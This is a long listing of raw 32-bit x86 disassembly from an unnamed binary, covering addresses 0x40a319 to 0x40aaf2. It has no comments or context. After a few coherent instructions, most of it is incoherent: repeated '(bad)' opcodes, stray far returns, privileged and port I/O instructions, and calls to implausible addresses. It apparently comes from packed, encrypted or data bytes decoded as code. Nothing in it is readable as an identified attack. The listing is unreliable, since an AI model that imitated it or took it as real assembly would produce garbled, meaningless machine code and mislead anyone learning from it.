  40a319:	shl    DWORD PTR ds:0xc103c233,cl
  40a31f:	jmp    0x40a331
  40a324:	mov    eax,DWORD PTR [ebp-0x4]
  40a327:	xor    eax,0x7510857
  40a32c:	add    eax,0x32729e
  40a331:	leave  
  40a332:	ret    0x4
  40a335:	dec    ebp
  40a336:	push   ebp
  40a337:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  40a33d:	mov    esp,ebp
  40a33f:	or     ah,dh
  40a341:	dec    ebp
  40a342:	add    bh,al
  40a344:	add    BYTE PTR [eax],cl
  40a346:	add    BYTE PTR [eax],al
  40a348:	mov    DWORD PTR [eax],0x40f44545
  40a34e:	xor    eax,0x9c8b8500
  40a353:	hlt    
  40a354:	clc    
  40a355:	retf   
  40a356:	(bad)  
  40a357:	enter  0x4d45,0xbc
  40a35b:	mov    esi,DWORD PTR [esp+esi*8]
  40a35e:	test   ebx,ecx
  40a360:	pushf  
  40a361:	enter  0x4df8,0x8b
  40a365:	mov    DWORD PTR [ebp-0x20],0x890208
  40a36c:	inc    ebp
  40a36d:	inc    ebp
  40a36e:	cld    
  40a36f:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40a375:	or     BYTE PTR [ebx+0x0],dl
  40a378:	mov    ebx,0x8bd5700
  40a37d:	call   DWORD PTR [ecx-0x1]
  40a380:	pop    es
  40a381:	mov    ch,0x33
  40a383:	dec    ebx
  40a385:	(bad)  
  40a386:	mov    eax,0x72009ea4
  40a38b:	push   DWORD PTR [edx]
  40a38d:	or     BYTE PTR [eax],al
  40a38f:	jmp    0xff89:0x75c84d03
  40a396:	dec    ebp
  40a397:	loopne 0x40a369
  40a399:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  40a39f:	add    BYTE PTR [ebx],dh
  40a3a1:	mov    ecx,ebx
  40a3a3:	hlt    
  40a3a4:	add    ecx,ebx
  40a3a6:	enter  0x899e,0x32
  40a3aa:	dec    ebp
  40a3ab:	add    ecx,eax
  40a3ad:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40a3b3:	or     DWORD PTR [ebx-0xb00b29c],0x0
  40a3ba:	xor    ecx,ebx
  40a3bc:	retf   
  40a3bd:	enter  0x4d03,0xc8
  40a3c1:	mov    DWORD PTR fs:[eax],ebx
  40a3c4:	lea    eax,[eax]
  40a3c6:	push   esp
  40a3c7:	mov    edi,edi
  40a3c9:	fs (bad) 
  40a3cb:	(bad)  
  40a3cc:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  40a3d2:	push   0xffffffff
  40a3d4:	and    bh,bh
  40a3d6:	pop    ecx
  40a3d7:	inc    eax
  40a3d8:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  40a3de:	push   0xffffff8b
  40a3e0:	pop    ecx
  40a3e1:	cld    
  40a3e2:	dec    ebp
  40a3e3:	lea    ecx,[ecx+0x45ff08ff]
  40a3e9:	mov    BYTE PTR [edx+0x1],cl
  40a3ec:	add    BYTE PTR [eax],al
  40a3ee:	mov    DWORD PTR [ebp+0x8],0x58008d
  40a3f5:	dec    DWORD PTR [ebp-0x77]
  40a3f8:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  40a3ff:	cld    
  40a400:	dec    ebp
  40a401:	jne    0x40a436
  40a403:	lea    eax,[ebx]
  40a405:	push   eax
  40a406:	mov    edi,edi
  40a408:	or     BYTE PTR [ecx+0x54a845],cl
  40a40e:	add    al,ch
  40a410:	(bad)  
  40a411:	sub    ebp,esp
  40a413:	add    BYTE PTR [eax],al
  40a415:	rol    BYTE PTR [eax],0x84
  40a418:	inc    ebp
  40a419:	add    dh,BYTE PTR [esi+0x0]
  40a41c:	add    BYTE PTR [ebp-0x73],al
  40a41f:	mov    ebp,DWORD PTR [esp+edx*4]
  40a422:	inc    DWORD PTR [eax]
  40a424:	lea    ecx,[ebx-0x30074f4]
  40a42a:	call   0x41afaf
  40a42f:	add    BYTE PTR [ebp+0x0],cl
  40a432:	jne    0x40a475
  40a434:	dec    DWORD PTR [ebx-0x76210314]
  40a43a:	dec    ebp
  40a43b:	add    DWORD PTR [ebp+0x0],esi
  40a43e:	(bad)  
  40a43f:	xchg   ebp,eax
  40a440:	loopne 0x40a441
  40a442:	inc    eax
  40a443:	inc    DWORD PTR [eax]
  40a445:	mov    ecx,DWORD PTR [ebp-0x4]
  40a448:	xor    edx,DWORD PTR [edx+0x7201b8]
  40a44e:	add    BYTE PTR [edx],dl
  40a450:	enter  0x4d90,0x0
  40a454:	mov    eax,DWORD PTR [eax]
  40a456:	hlt    
  40a457:	add    al,0xa5
  40a459:	mov    al,0xff
  40a45b:	add    bh,bh
  40a45d:	add    BYTE PTR [ebx],dh
  40a45f:	inc    DWORD PTR [ebx]
  40a461:	sbb    al,0x89
  40a463:	jne    0x40a43d
  40a465:	mov    esp,DWORD PTR [ecx+0x4500fc]
  40a46b:	mov    eax,DWORD PTR [ebp-0xff0048]
  40a471:	mov    DWORD PTR [eax-0x70],0xee58e189
  40a478:	inc    DWORD PTR [ebp-0x75]
  40a47b:	ror    DWORD PTR [esp+ebp*8],1
  40a47e:	test   DWORD PTR [esi-0x1],esp
  40a481:	inc    ebp
  40a482:	(bad)  
  40a483:	aas    
  40a484:	inc    ebp
  40a485:	(bad)  
  40a486:	lea    edi,[esp+eiz*2-0x1]
  40a48a:	push   DWORD PTR [edi]
  40a48c:	mov    DWORD PTR [ecx],esi
  40a48e:	mov    al,ds:0x8b8000c7
  40a493:	out    dx,al
  40a494:	cld    
  40a495:	call   0xed3fea27
  40a49a:	(bad)  
  40a49b:	fisttp WORD PTR [eax+0x8801c7]
  40a4a1:	jmp    0x40a4e8
  40a4a3:	out    dx,al
  40a4a4:	inc    DWORD PTR [ebp-0x4]
  40a4a7:	xlat   BYTE PTR ds:[ebx]
  40a4a8:	lea    edi,[edi]
  40a4aa:	inc    edi
  40a4ac:	jmp    FWORD PTR [eax-0x78]
  40a4af:	inc    DWORD PTR [ecx]
  40a4b1:	aaa    
  40a4b2:	add    BYTE PTR [ecx],dh
  40a4b4:	pop    ecx
  40a4b5:	mov    DWORD PTR [eax],0xfff856c
  40a4bb:	ffreep st(5)
  40a4bd:	aas    
  40a4be:	add    bh,al
  40a4c0:	mov    esi,DWORD PTR [eax-0x4]
  40a4c3:	inc    DWORD PTR [eax+0xdf01ec]
  40a4c9:	(bad)  
  40a4ca:	or     BYTE PTR [ebp+eax*2-0x1],dh
  40a4ce:	mov    esp,ebx
  40a4d0:	xchg   esp,eax
  40a4d1:	rol    DWORD PTR [eax],cl
  40a4d3:	(bad)  
  40a4d4:	mov    edi,DWORD PTR [eax+0x3]
  40a4d7:	(bad)  
  40a4d8:	cmp    al,0xd7
  40a4da:	dec    ebp
  40a4db:	lds    ecx,FWORD PTR [ebx+0x2ad8e8]
  40a4e1:	add    BYTE PTR [ebp-0x3b375],cl
  40a4e7:	adc    BYTE PTR [edx+0x1],0x55
  40a4eb:	add    BYTE PTR [ebx+0x6c8c30],cl
  40a4f1:	add    BYTE PTR [ebx-0x778afc7b],cl
  40a4f7:	mov    eax,DWORD PTR [eax]
  40a4f9:	cld    
  40a4fa:	push   0x7d
  40a4fc:	dec    DWORD PTR [ebx+0xd88c]
  40a502:	push   edx
  40a503:	mov    edx,DWORD PTR [ecx-0x4]
  40a506:	call   DWORD PTR [eax+0x7d01fc]
  40a50c:	mov    ecx,DWORD PTR [ebx+0x509000fc]
  40a512:	add    DWORD PTR [esi+0x0],edx
  40a515:	test   DWORD PTR [ebp+0x75],eax
  40a518:	call   0xc83d85a8
  40a51d:	jge    0x40a4b3
  40a51f:	mov    ebp,ebx
  40a521:	fcom   st(7)
  40a523:	add    bh,al
  40a525:	mov    ebx,DWORD PTR [eax-0x7a6f8304]
  40a52b:	add    edi,edi
  40a52d:	add    bh,bh
  40a52f:	imul   esp,ecx,0x4550d400
  40a535:	push   esi
  40a536:	fisttp WORD PTR [ebx+0x4dc7f43f]
  40a53c:	test   BYTE PTR [ebx],dh
  40a53e:	aam    0x5
  40a540:	retf   0x4572
  40a543:	add    bl,ah
  40a545:	rcl    ebx,0x84
  40a548:	mov    DWORD PTR [ecx],0x46d1008c
  40a54e:	jl     0x40a550
  40a550:	test   edi,eax
  40a552:	jmp    esp
  40a554:	inc    DWORD PTR [eax]
  40a556:	loope  0x40a558
  40a558:	aam    0x75
  40a55a:	test   DWORD PTR [ebx+0x45fffcff],ecx
  40a560:	out    dx,al
  40a561:	mov    ebp,eax
  40a563:	mov    ah,0x85
  40a565:	add    bh,bh
  40a567:	call   0x114d06b
  40a56c:	retf   0x858b
  40a56f:	cld    
  40a570:	inc    DWORD PTR [eax+0xeb01ff]
  40a576:	out    dx,al
  40a577:	xor    BYTE PTR [ebp-0xff001e],al
  40a57d:	mov    edx,ecx
  40a57f:	cld    
  40a580:	jl     0x40a50b
  40a582:	mov    edx,0x50000001
  40a587:	add    DWORD PTR [ebp+0x45],eax
  40a58a:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  40a590:	dec    DWORD PTR [ebx-0x3fd80318]
  40a596:	add    BYTE PTR [ebp-0xbf0040],dl
  40a59c:	inc    ebp
  40a59d:	xor    DWORD PTR [ebx-0x4faf0400],ecx
  40a5a3:	inc    ebp
  40a5a4:	add    DWORD PTR [ebx+0x459c00],ecx
  40a5aa:	mov    edi,edi
  40a5ac:	mov    eax,0xe80800ff
  40a5b1:	inc    ebp
  40a5b2:	sub    cl,BYTE PTR [ebx-0x47000400]
  40a5b8:	add    al,0x1
  40a5ba:	rol    BYTE PTR [eax],0x1e
  40a5bd:	jne    0x40a604
  40a5bf:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  40a5c5:	inc    DWORD PTR [ecx]
  40a5c7:	call   0x85cfcc
  40a5cc:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  40a5d2:	call   0x40cfd8
  40a5d7:	xor    bh,bh
  40a5d9:	push   edi
  40a5da:	adc    BYTE PTR [ebx-0x747423bb],al
  40a5e0:	loopne 0x40a5be
  40a5e2:	ret    
  40a5e3:	loopne 0x40a583
  40a5e5:	xor    DWORD PTR [edx],0x31
  40a5e8:	cmp    edi,edi
  40a5ea:	bswap  esp
  40a5ec:	rol    BYTE PTR gs:[eax],0x5
  40a5f0:	jmp    0x12ba73a
  40a5f5:	mov    eax,DWORD PTR [ebp-0x4]
  40a5f8:	add    BYTE PTR [eax+0xff0100],bh
  40a5fe:	cld    
  40a5ff:	jne    0x40a67e
  40a601:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  40a607:	mov    DWORD PTR [ecx],0x30500000
  40a60d:	inc    ebp
  40a60e:	add    BYTE PTR [ebx+0x459850],cl
  40a614:	mov    edi,edi
  40a616:	test   al,0xff
  40a618:	add    BYTE PTR [eax],cl
  40a61a:	inc    DWORD PTR [ebp-0x18]
  40a61d:	jmp    DWORD PTR [esi]
  40a61f:	fadd   QWORD PTR [eax]
  40a621:	jge    0x40a670
  40a623:	adc    BYTE PTR [ebx+0x459cb9],cl
  40a629:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  40a62f:	sahf   
  40a630:	mov    eax,0x30132
  40a635:	lea    esi,[ebp+0x2c]
  40a638:	xor    edi,edi
  40a63a:	(bad)  
  40a63b:	call   0x13fcfa8
  40a640:	call   0x134d0d0
  40a645:	jne    0x40a5d2
  40a647:	xor    edi,esp
  40a649:	add    eax,DWORD PTR [eax+0xc018d]
  40a64f:	push   DWORD PTR [eax]
  40a651:	call   0xc9cfad
  40a656:	int3   
  40a657:	inc    DWORD PTR [ebp-0x14]
  40a65a:	mov    ecx,DWORD PTR [ebp-0x28]
  40a65d:	xor    eax,DWORD PTR [eax]
  40a65f:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40a665:	(bad)  
  40a666:	xchg   ebp,eax
  40a667:	in     al,0xff
  40a669:	add    bh,bh
  40a66b:	add    BYTE PTR [esi],al
  40a66d:	inc    ebp
  40a66e:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  40a674:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff62]
  40a67b:	mov    edi,edi
  40a67d:	or     BYTE PTR [eax],cl
  40a67f:	inc    ebp
  40a680:	test   DWORD PTR gs:[eax],eax
  40a683:	je     0x40a6ca
  40a685:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  40a68b:	xor    edx,DWORD PTR [eax-0x73]
  40a68e:	push   ebp
  40a68f:	or     BYTE PTR [ebp+0x21007572],al
  40a695:	inc    ebp
  40a696:	in     al,dx
  40a697:	mov    ebp,DWORD PTR [eax]
  40a699:	mov    esp,0x628bc345
  40a69e:	fmul   st,st(5)
  40a6a0:	add    BYTE PTR [ebx],ch
  40a6a2:	mov    eax,DWORD PTR [ebx]
  40a6a4:	cld    
  40a6a5:	loopne 0x40a667
  40a6a7:	inc    ebp
  40a6a8:	push   ebp
  40a6a9:	cmp    ebp,eax
  40a6ab:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  40a6b2:	cld    
  40a6b3:	fadd   DWORD PTR [eax+0x3b014d]
  40a6b9:	jne    0x40a6eb
  40a6bb:	push   0xf8898557
  40a6c0:	in     al,dx
  40a6c1:	jne    0x40a708
  40a6c3:	lea    eax,[ebx+0x72e8dcc8]
  40a6c9:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  40a6cf:	jmp    0x40a704
  40a6d1:	mov    edi,DWORD PTR [edi+0x4572bc]
  40a6d7:	xor    eax,edi
  40a6d9:	adc    DWORD PTR [ebp-0xcd0062],0x8b9231
  40a6e3:	rcl    BYTE PTR [eax-0x40],1
  40a6e6:	inc    ebp
  40a6e7:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  40a6ef:	inc    ebp
  40a6f0:	xchg   ebp,eax
  40a6f1:	ud0    ebp,DWORD PTR [ebx]
  40a6f4:	inc    DWORD PTR [eax]
  40a6f6:	jl     0x40a76e
  40a6f8:	add    BYTE PTR [edx+0x1f558050],cl
  40a6fe:	mov    ecx,DWORD PTR [esp+esi*8]
  40a701:	inc    eax
  40a702:	retf   
  40a703:	inc    ebp
  40a704:	iret   
  40a705:	jb     0x40a6cf
  40a707:	mov    eax,DWORD PTR [edi]
  40a709:	enter  0x4545,0x1
  40a70d:	xor    eax,0x898b9c00
  40a712:	mov    esp,0x33344df0
  40a717:	pushf  
  40a718:	lea    ecx,[ecx+0x4d72e008]
  40a71e:	add    BYTE PTR [ebx],dh
  40a720:	inc    ebp
  40a721:	mov    DWORD PTR [ebx-0x3f611b4c],ecx
  40a727:	xor    dl,BYTE PTR [edx]
  40a729:	add    eax,DWORD PTR [ebp-0x77]
  40a72c:	mov    eax,esp
  40a72e:	fmul   DWORD PTR [ebp-0x3d]
  40a731:	xor    eax,DWORD PTR [ebx+eax*1+0x832899e]
  40a738:	mov    DWORD PTR [ebp-0x28],eax
  40a73b:	aad    0x45
  40a73d:	pushf  
  40a73e:	xor    eax,edi
  40a740:	mov    ecx,0xff858db0
  40a745:	clc    
  40a746:	enter  0x4d45,0x32
  40a74a:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  40a751:	test   esi,edi
  40a753:	clc    
  40a754:	inc    DWORD PTR [ebp+0x45]
  40a757:	xor    BYTE PTR [ebx-0x3738f764],cl
  40a75d:	test   al,0x16
  40a75f:	test   DWORD PTR ds:0xff459cf8,esi
  40a765:	ds cld 
  40a767:	pushf  
  40a768:	inc    ebp
  40a769:	mov    edx,DWORD PTR [eax-0x28]
  40a76c:	outs   dx,DWORD PTR ds:[esi]
  40a76d:	push   ebp
  40a76e:	add    BYTE PTR [ebx],dh
  40a770:	mov    DWORD PTR [ebx],eax
  40a772:	sar    BYTE PTR [ebx],1
  40a774:	adc    BYTE PTR [edi],cl
  40a776:	dec    ebp
  40a777:	adc    al,0x8b
  40a779:	add    al,dl
  40a77b:	jmp    0x101a94b
  40a780:	jb     0x40a7cf
  40a782:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40a788:	xor    ecx,DWORD PTR [ebp+0x3b]
  40a78b:	xor    ecx,DWORD PTR [edi]
  40a78d:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  40a791:	(bad)  
  40a793:	clc    
  40a794:	enter  0x8400,0x8b
  40a798:	pop    es
  40a799:	mov    al,0x0
  40a79b:	push   ebp
  40a79c:	push   cs
  40a79d:	xor    ecx,eax
  40a79f:	xor    esp,ecx
  40a7a1:	add    ebp,DWORD PTR [eax]
  40a7a3:	add    esi,DWORD PTR [eax]
  40a7a5:	(bad)  
  40a7a7:	retf   0x55c8
  40a7aa:	repnz mov eax,DWORD PTR [ebp-0x10]
  40a7ae:	(bad)  
  40a7af:	cli    
  40a7b0:	fdivr  st,st(1)
  40a7b2:	test   DWORD PTR [eax+edi*8],ecx
  40a7b5:	dec    ebp
  40a7b6:	inc    ebp
  40a7b7:	xor    edi,DWORD PTR [eax-0x7167afd]
  40a7bd:	add    BYTE PTR [ebp+0x0],al
  40a7c0:	mov    ecx,DWORD PTR [ebp-0x28]
  40a7c3:	mov    ecx,ebx
  40a7c5:	clc    
  40a7c6:	jne    0x40a793
  40a7c8:	mov    esi,0xd672d3
  40a7cd:	into   
  40a7ce:	into   
  40a7cf:	scas   eax,DWORD PTR es:[edi]
  40a7d0:	dec    ebp
  40a7d1:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  40a7d7:	sub    ecx,esi
  40a7d9:	cmp    ecx,DWORD PTR [ebp+0x77]
  40a7dc:	(bad)  
  40a7dd:	mov    edi,eax
  40a7df:	mov    al,0x85
  40a7e1:	mov    eax,edi
  40a7e3:	add    BYTE PTR [ebp-0x75],al
  40a7e6:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  40a7ed:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40a7f3:	rdtsc  
  40a7f5:	retf   0x559c
  40a7f8:	(bad)  
  40a7f9:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  40a800:	inc    ebp
  40a801:	add    eax,0xeb9c4d3f
  40a806:	(bad)  
  40a807:	mov    ecx,esp
  40a809:	lods   al,BYTE PTR ds:[esi]
  40a80a:	test   DWORD PTR [ebp-0x8],edx
  40a80d:	xor    ecx,DWORD PTR [ebp+0x33]
  40a810:	mov    eax,DWORD PTR [ebx]
  40a812:	lock add ecx,ebx
  40a815:	bswap  esi
  40a817:	retf   0x55d1
  40a81a:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  40a820:	jmp    0x40a81b
  40a822:	add    BYTE PTR ds:0xebc44d8b,al
  40a828:	push   ebp
  40a829:	mov    ebp,DWORD PTR [ebx]
  40a82b:	test   al,0x8b
  40a82d:	push   ebp
  40a82e:	clc    
  40a82f:	xor    ecx,ebx
  40a831:	xor    ecx,esi
  40a833:	add    edx,ecx
  40a835:	add    eax,DWORD PTR [edx+0xca010f]
  40a83b:	push   ebp
  40a83c:	dec    ebp
  40a83d:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40a843:	stc    
  40a844:	rol    DWORD PTR ds:0xebce4dd6,cl
  40a84a:	scas   eax,DWORD PTR es:[edi]
  40a84b:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  40a851:	xor    ebp,DWORD PTR [ebx]
  40a853:	xor    edi,DWORD PTR [ebx]
  40a855:	add    esi,DWORD PTR [edi+0x3]
  40a858:	mov    ecx,DWORD PTR [edi]
  40a85a:	clc    
  40a85b:	retf   0x55cb
  40a85e:	into   
  40a85f:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40a866:	mov    eax,0x3376554d
  40a86b:	mov    esi,DWORD PTR [ebx]
  40a86d:	int3   
  40a86e:	add    edx,DWORD PTR [ebp+0x3]
  40a871:	xor    ecx,DWORD PTR [edi]
  40a873:	xor    ecx,edx
  40a875:	add    edx,DWORD PTR [ebp+0x3]
  40a878:	mov    ecx,DWORD PTR [edi]
  40a87a:	lock retf 0x4dfa
  40a87e:	stc    
  40a87f:	mov    ecx,DWORD PTR [eax]
  40a881:	or     BYTE PTR [ebp+0x4d],cl
  40a884:	jmp    0x104a914
  40a889:	dec    ebp
  40a88a:	dec    ebp
  40a88b:	(bad)  
  40a88c:	mov    ebx,esp
  40a88e:	clc    
  40a88f:	test   ebx,ecx
  40a891:	clc    
  40a892:	ror    DWORD PTR [ebp-0x2a],cl
  40a895:	mov    esi,ecx
  40a897:	call   0x33cbee4b
  40a89c:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40a8a3:	retf   
  40a8a4:	ja     0x40a874
  40a8a6:	mov    ebp,DWORD PTR [eax-0x48]
  40a8a9:	dec    ebp
  40a8aa:	xor    ecx,DWORD PTR [di+0x3]
  40a8ae:	mov    esp,esp
  40a8b0:	clc    
  40a8b1:	push   ebp
  40a8b2:	retf   
  40a8b3:	mov    dl,bl
  40a8b5:	adc    esi,edx
  40a8b7:	jb     0x40a887
  40a8b9:	add    BYTE PTR [edi-0x3b7474b3],ch
  40a8bf:	call   0x4d6c7441
  40a8c4:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  40a8ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8cb:	sahf   
  40a8cc:	inc    ebp
  40a8cd:	xor    cl,BYTE PTR [ebp-0x78]
  40a8d0:	mov    edx,edi
  40a8d2:	clc    
  40a8d3:	dec    ebp
  40a8d4:	retf   
  40a8d5:	mov    edx,ebx
  40a8d7:	call   0x560f7cb2
  40a8dc:	scas   eax,DWORD PTR es:[edi]
  40a8dd:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  40a8e3:	sahf   
  40a8e4:	sub    esi,DWORD PTR [edx]
  40a8e6:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40a8ec:	lods   al,BYTE PTR ds:[esi]
  40a8ed:	xor    esp,DWORD PTR [ebx]
  40a8ef:	add    ecx,DWORD PTR [ebp-0x1c]
  40a8f2:	mov    edi,DWORD PTR [ebp-0x8]
  40a8f5:	mov    bl,cl
  40a8f7:	cmp    dl,bl
  40a8f9:	jb     0x40a8c9
  40a8fb:	add    dh,dl
  40a8fd:	dec    ebp
  40a8fe:	scas   eax,DWORD PTR es:[edi]
  40a8ff:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  40a905:	shr    DWORD PTR [ebx],cl
  40a907:	into   
  40a908:	cmp    edx,esi
  40a90a:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  40a910:	dec    ebp
  40a911:	dec    ebp
  40a912:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  40a918:	retf   
  40a919:	xor    edx,esi
  40a91b:	add    ecx,esi
  40a91d:	imul   ecx,edx
  40a920:	mov    DWORD PTR [ebp+0x8],edx
  40a923:	xor    ecx,DWORD PTR [ebp+0x2b]
  40a926:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  40a92c:	add    esi,DWORD PTR [ebx]
  40a92e:	mov    ah,0x3
  40a930:	inc    ebp
  40a931:	sysexit 
  40a933:	xlat   BYTE PTR ds:[ebx]
  40a934:	pushf  
  40a935:	jge    0x40a8c0
  40a937:	xor    ebx,eax
  40a939:	sub    eax,DWORD PTR [ebp-0x73]
  40a93c:	(bad)  
  40a93d:	cmp    al,al
  40a93f:	jb     0x40a8c6
  40a941:	add    al,bh
  40a943:	ror    DWORD PTR [ebp-0x7a],1
  40a946:	xor    edi,edi
  40a948:	add    edi,edi
  40a94a:	jmp    0x40a999
  40a94c:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40a952:	dec    ebp
  40a953:	into   
  40a954:	mov    ebp,DWORD PTR [edi-0x23737428]
  40a95a:	sahf   
  40a95b:	shl    DWORD PTR [edx],cl
  40a95d:	retf   0x5588
  40a960:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40a966:	add    eax,DWORD PTR [eax]
  40a968:	in     al,0x4d
  40a96a:	push   ebp
  40a96b:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  40a971:	bound  eax,QWORD PTR [eax]
  40a973:	int    0x4d
  40a975:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  40a97b:	dec    ebp
  40a97c:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  40a982:	jge    0x40a952
  40a984:	mov    BYTE PTR [edi+0xf723b3a],ch
  40a98a:	add    cl,dh
  40a98c:	dec    ebp
  40a98d:	dec    DWORD PTR [ebx-0x2c032375]
  40a993:	adc    BYTE PTR [ebp+0x1],0x8b
  40a997:	add    al,bl
  40a999:	jge    0x40a927
  40a99b:	push   0xffffff9e
  40a99d:	push   0x8b3032
  40a9a2:	shl    BYTE PTR [ebp+0x55],0x6a
  40a9a6:	xor    edi,edi
  40a9a8:	xor    edx,DWORD PTR [ebx+eax*1]
  40a9ab:	inc    ebp
  40a9ac:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  40a9b2:	dec    ebp
  40a9b3:	or     BYTE PTR [ecx+0x4dc8e483],cl
  40a9b9:	jbe    0x40a946
  40a9bb:	mov    ebp,esp
  40a9bd:	ror    bl,1
  40a9bf:	enter  0x14ce,0xaf
  40a9c3:	dec    DWORD PTR [ebx-0x2cef17f8]
  40a9c9:	push   ebp
  40a9ca:	retf   0x5540
  40a9cd:	push   ebp
  40a9ce:	mov    esi,DWORD PTR [edx-0x1c]
  40a9d1:	mov    edx,ebx
  40a9d3:	cld    
  40a9d4:	(bad)  
  40a9d5:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  40a9dc:	sti    
  40a9dd:	add    dh,cl
  40a9df:	push   0xffffff94
  40a9e1:	call   FWORD PTR [esi+0x3b5032d0]
  40a9e7:	mov    ecx,DWORD PTR [edi]
  40a9e9:	int3   
  40a9ea:	pop    esi
  40a9eb:	inc    ebp
  40a9ec:	dec    DWORD PTR [ecx+0x45e8c88b]
  40a9f2:	push   ebp
  40a9f3:	xor    esi,DWORD PTR [ebx]
  40a9f5:	mov    DWORD PTR [ebx],0xcacc0f9c
  40a9fb:	aas    
  40a9fc:	push   ebp
  40a9fd:	inc    ebp
  40a9fe:	xor    eax,esp
  40aa00:	add    eax,esp
  40aa02:	mov    eax,DWORD PTR [ebx]
  40aa04:	(bad)  
  40aa05:	jmp    0x40a993
  40aa07:	mov    bl,BYTE PTR [esi-0x7674cdfb]
  40aa0d:	rol    ah,1
  40aa0f:	mov    esi,0xf133104d
  40aa14:	mov    edx,0xff358d80
  40aa19:	mov    dh,0xd1
  40aa1b:	cmp    edx,DWORD PTR [ebp+0xf]
  40aa1e:	mov    eax,DWORD PTR [edx-0x20]
  40aa21:	add    BYTE PTR [ebp-0x75],bh
  40aa24:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  40aa2b:	sahf   
  40aa2c:	retf   0x8632
  40aa2f:	cmp    ebp,0x8
  40aa32:	call   ebx
  40aa34:	inc    ebp
  40aa35:	inc    ebp
  40aa36:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  40aa3c:	mov    esi,DWORD PTR ds:0xc7049cc8
  40aa42:	add    al,al
  40aa44:	add    bl,al
  40aa46:	(bad)  
  40aa47:	clc    
  40aa48:	enter  0x45,0x35
  40aa4c:	push   eax
  40aa4d:	pushf  
  40aa4e:	mov    edi,eax
  40aa50:	int3   
  40aa51:	or     al,al
  40aa53:	test   DWORD PTR [edi],edi
  40aa55:	clc    
  40aa56:	gs inc ebp
  40aa58:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  40aa5e:	push   ss
  40aa5f:	xor    ecx,DWORD PTR [ebp+0x3]
  40aa62:	sub    edx,DWORD PTR [ecx-0x76]
  40aa65:	dec    ebp
  40aa66:	add    DWORD PTR [ebx+0x88d845],ecx
  40aa6c:	mov    esi,DWORD PTR [ebx]
  40aa6e:	or     BYTE PTR [ebx],al
  40aa70:	cmp    edx,DWORD PTR [ecx-0x38]
  40aa73:	dec    ebp
  40aa74:	out    dx,eax
  40aa75:	xor    eax,DWORD PTR [ebp+0x3]
  40aa78:	mov    edx,DWORD PTR [ecx-0x28]
  40aa7b:	dec    ebp
  40aa7c:	add    BYTE PTR [ebx],dh
  40aa7e:	push   0x518003
  40aa83:	push   eax
  40aa84:	add    BYTE PTR [ebx-0x300748b],cl
  40aa8a:	sbb    BYTE PTR [ebp+0x45],cl
  40aa8d:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40aa93:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  40aa99:	dec    ebp
  40aa9a:	inc    ebp
  40aa9b:	xor    eax,esp
  40aa9d:	add    eax,esp
  40aa9f:	push   ecx
  40aaa0:	(bad)  
  40aaa1:	dec    ebp
  40aaa2:	mov    al,ds:0xc9e031ff
  40aaa7:	retf   
  40aaa8:	(bad)  
  40aaa9:	into   
  40aaaa:	sub    bh,bh
  40aaac:	dec    esp
  40aaad:	adc    al,0x9c
  40aaaf:	inc    ebp
  40aab0:	push   ebp
  40aab1:	test   DWORD PTR [edi],ecx
  40aab3:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab6ff80]
  40aaba:	jmp    0xc9b9b9ce
  40aabf:	add    cl,dl
  40aac1:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  40aacb:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  40aad1:	rol    BYTE PTR [eax],0x57
  40aad4:	clc    
  40aad5:	bound  esi,QWORD PTR [edx+0x7]
  40aad8:	mov    eax,DWORD PTR [ebp-0x30]
  40aadb:	xor    al,0x40
  40aadd:	sub    al,0xc7
  40aadf:	mov    ah,ch
  40aae1:	add    DWORD PTR [ebp+0x4534f845],eax
  40aae7:	sub    al,0x86
  40aae9:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  40aaf0:	mov    ch,0xff
  40aaf2:	clc    
